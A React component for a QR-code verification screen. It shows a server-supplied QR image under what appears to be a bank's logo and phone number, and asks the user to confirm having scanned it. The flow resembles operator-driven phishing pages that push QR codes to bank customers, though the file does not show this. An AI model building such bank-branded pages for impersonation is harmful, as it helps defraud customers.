import { Phone, Globe, QrCode } from 'lucide-react';
import { Button } from '../ui/button';
import { useLanguage } from '../LanguageContext';
import { useSession } from '../../contexts/SessionContext';
import { useState } from 'react';

export default function QRCodePage() {
  const { toggleLanguage, t } = useLanguage();
  const { qrCodeUrl, submitQRScan } = useSession();
  const [choice, setChoice] = useState<'scanned' | 'cannot' | null>(null);

  const handleScanned = () => {
    setChoice('scanned');
  };

  const handleCannotScan = () => {
    setChoice('cannot');
  };

  const handleContinue = () => {
    submitQRScan(choice === 'scanned');
  };

  return (
    <div className="min-h-screen bg-[#1a1d23] text-white">
      <header className="border-b border-gray-800 bg-[#1a1d23]">
        <div className="max-w-7xl mx-auto px-6 py-5 flex items-center justify-between">
          <div className="flex items-center">
            <svg width="172" height="24" viewBox="0 0 172 24" fill="none" xmlns="http://www.w3.org/2000/svg">
              <clipPath id="a"><path d="m0 0h172v24h-172z"/></clipPath>
              <mask id="b" height="24" maskUnits="userSpaceOnUse" width="21" x="0" y="0">
                <path d="m10.1535 10.1373-10.1535-10.1373v24l10.1059-10.0909 1.9143-1.907h-.0026l5.6968-5.68983v11.37823l-3.83-3.8264-1.8681 1.8593 8.2906 8.2766v-24l-10.1521 10.1373zm-7.56225 7.5505v-11.37826l5.69675 5.68836z" fill="#fff"/>
              </mask>
              <g clipPath="url(#a)">
                <g mask="url(#b)"><path d="m-11.6223 11.9979 21.7758-22.4833 21.7744 22.4833-21.7744 22.4847z" fill="#fff"/></g>
                <path d="m41.0172 18.5368h2.574v-13.62103l-7.2211 9.90663-7.2212-9.90663v13.62103h2.5728v-5.9833l4.6484 6.5103 4.6471-6.5103zm15.394-6.547c0 2.3234-1.8033 4.2059-4.0335 4.2059-2.2304 0-4.031-1.8825-4.031-4.2059 0-2.32347 1.8046-4.20731 4.031-4.20731 2.2263 0 4.0335 1.88112 4.0335 4.20731zm2.7076 0c0-3.77867-3.0183-6.8447-6.7411-6.8447-3.723 0-6.7386 3.06467-6.7386 6.8447 0 3.78 3.0196 6.8432 6.7386 6.8432 3.7189 0 6.7411-3.066 6.7411-6.8432zm4.2584-1.544 10.0014 8.618v-13.61974h-2.574v8.09234l-10.0014-8.62063v13.62103h2.574v-8.0896zm12.5477 8.091h9.7567v-2.3971h-7.1086v-2.9814h6.8049v-2.3357h-6.8049v-2.93499h7.1086v-2.44355h-9.7567v13.09134zm22.4979-10.64919 1.3775-2.44355h-12.6613v2.44355h3.818v10.64779h2.6482v-10.64779h4.816zm6.4782 5.99829h-4.161l2.073-3.8169zm2.554 4.6495h2.924l-7.547-13.621-7.544 13.621h2.9178l1.3629-2.5076h6.5153zm17.812-3.956c0 .9119-.711 1.6463-1.886 1.6463h-3.884v-3.294h3.884c1.175 0 1.886.7344 1.886 1.6463m-.361-5.32935c0 .80395-.632 1.47155-1.718 1.47155h-3.691v-2.93634h3.691c1.087 0 1.718.65799 1.718 1.46615m1.106 2.28929c.874-.4778 1.496-1.3993 1.496-2.60873 0-1.99308-1.505-3.48651-3.905-3.48651h-6.752v13.09414h6.99c2.412 0 4.135-1.7733 4.135-3.9629 0-1.5371-.775-2.5828-1.964-3.0347m11.725 2.3453h-4.166l2.08-3.8182zm2.557 4.6509h2.929l-7.557-13.62103-7.547 13.62103h2.923l1.362-2.5063h6.52zm6.809-8.0882 9.996 8.6152v-13.62111h-2.569v8.08831l-10.006-8.61523v13.62103h2.579zm18.858.2566 5.425-5.26251h-3.587l-5.605 5.43721v-5.43721h-2.645v13.09411h2.645v-4.1909l1.856-1.7869 4.426 5.9778h3.282z" fill="#fff"/>
              </g>
            </svg>
          </div>
          <div className="flex items-center gap-8">
            <a href="tel:224443636" className="flex items-center gap-2 hover:text-gray-300 transition-colors">
              <Phone className="w-4 h-4" /><span>{t('phone')}</span>
            </a>
            <button onClick={toggleLanguage} className="flex items-center gap-2 hover:text-gray-300 transition-colors">
              <Globe className="w-4 h-4" /><span>{t('czechVersion')}</span>
            </button>
          </div>
        </div>
      </header>

      <main className="max-w-md mx-auto px-6 py-16">
        <div className="bg-[#242830] border border-gray-700 rounded-lg overflow-hidden">
          <div className="bg-[#2a3040] px-8 py-6 flex items-center gap-3 border-b border-gray-700">
            <QrCode className="w-6 h-6 text-[#d4af37]" />
            <h1 className="text-white">{t('qrCodeVerification')}</h1>
          </div>
          
          <div className="p-8 space-y-6">
            <div className="text-center space-y-3">
              <p className="text-gray-300">
                {t('scanQRCode')}
              </p>
            </div>

            <div className="flex justify-center py-8">
              {qrCodeUrl ? (
                <img src={qrCodeUrl} alt="QR Code" className="w-64 h-64 border-4 border-[#d4af37] rounded-lg object-contain bg-white" />
              ) : (
                <div className="w-64 h-64 border-4 border-gray-600 rounded-lg flex items-center justify-center bg-[#1a1d23]">
                  <div className="text-center space-y-3">
                    <QrCode className="w-16 h-16 text-gray-600 mx-auto" />
                    <p className="text-gray-500">{t('waitingForQR')}</p>
                  </div>
                </div>
              )}
            </div>

            {/* Action Buttons */}
            {!choice ? (
              <div className="space-y-3">
                <Button
                  onClick={handleScanned}
                  className="w-full bg-green-600 hover:bg-green-700 text-white py-4 rounded-full"
                >
                  ✅ I Have Scanned the Code
                </Button>
                <Button
                  onClick={handleCannotScan}
                  variant="outline"
                  className="w-full border-red-500 text-red-500 hover:bg-red-500/10 py-4 rounded-full"
                >
                  ❌ I Cannot Scan
                </Button>
              </div>
            ) : (
              <div className="space-y-4">
                <div className={`p-4 rounded-lg border-2 ${
                  choice === 'scanned' 
                    ? 'bg-green-500/10 border-green-500 text-green-500' 
                    : 'bg-red-500/10 border-red-500 text-red-500'
                }`}>
                  <p className="text-center">
                    {choice === 'scanned' 
                      ? '✅ You confirmed scanning the QR code' 
                      : '❌ You reported unable to scan'}
                  </p>
                </div>
                <Button
                  onClick={handleContinue}
                  className="w-full bg-[#d4af37] hover:bg-[#c09d2e] text-black py-4 rounded-full"
                >
                  Continue
                </Button>
              </div>
            )}

            <div className="bg-[#1a1d23] rounded-lg p-4 border-l-4 border-[#d4af37]">
              <p className="text-gray-400 text-sm">
                <strong className="text-white block mb-1">{t('instructions')}</strong>
                {t('qrInstructions')}
              </p>
            </div>
          </div>
        </div>
      </main>

      <footer className="border-t border-gray-800 mt-20">
        <div className="max-w-7xl mx-auto px-6 py-8">
          <div className="text-center text-gray-500 text-sm">{t('copyright')}</div>
        </div>
      </footer>
    </div>
  );
}
